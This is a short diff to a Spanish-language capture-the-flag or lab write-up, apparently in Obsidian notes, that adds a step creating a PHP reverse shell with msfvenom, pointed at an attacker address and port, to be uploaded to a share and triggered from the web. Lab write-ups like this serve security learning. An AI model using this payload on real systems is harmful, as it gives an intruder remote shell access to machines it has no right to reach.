@@ -152,5 +152,10 @@ una ves dentro de los recursos compartidos de `c.bum` podemos navegar hasta el d
 ![[Pasted image 20240810141543.png]]
 
 ### Reverse shell
-en este punto vamos a crear una reverse shell usando `msfvenom` para subirla a este recurso compartido y luego llamarla desde la web para poder 
+en este punto vamos a crear una reverse shell usando `msfvenom` para subirla a este recurso compartido y luego llamarla desde la web para poder obtener una conexión
+
+```python
+msfvenom -p php/reverse_php LHOST=10.10.14.8 LPORT=9001 -f raw > rawr.php
+```
+
 ![[Pasted image 20240810142207.png]]
